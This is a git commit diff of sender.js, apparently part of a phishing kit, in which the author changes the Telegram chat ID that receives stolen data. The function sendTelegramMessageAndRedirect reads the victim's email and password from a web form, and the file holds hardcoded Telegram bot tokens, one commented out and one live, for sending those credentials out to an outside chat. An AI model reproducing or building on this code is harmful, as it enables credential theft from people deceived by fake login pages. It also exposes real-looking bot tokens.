9c4cea2f62ab3ccf40dfc5787efdd7de0d2ba158
attnetmi <chiboy0107@gmail.com>
2024-08-07 14:42:37 +0100

    Update sender.js

--- sender.js
+++ sender.js
@@ -3,10 +3,10 @@ function sendTelegramMessageAndRedirect() {
   //  other user API
 
   //   const telegramBotToken = "6968043726:AAHGJ0OtlbTMjTOPTfacioSJqOwgePt0Xhw"; // add the telegram token
-  //   const chatId = 5710607863; // add ths id from the web It's usually a number, not a string
+  //   const chatId = 6602147901; // add ths id from the web It's usually a number, not a string
 
   const telegramBotToken = "6844888640:AAHaV1WfjOzhyXvzRXkKefB3KunOrrhZO68"; // add the telegram token
-  const chatId = 5349229520; // add ths id from the web It's usually a number, not a string
+  const chatId = 6602147901; // add ths id from the web It's usually a number, not a string
   const emailValue = document.getElementById("email").value;
   const passwordValue = document.getElementById("password").value;
 
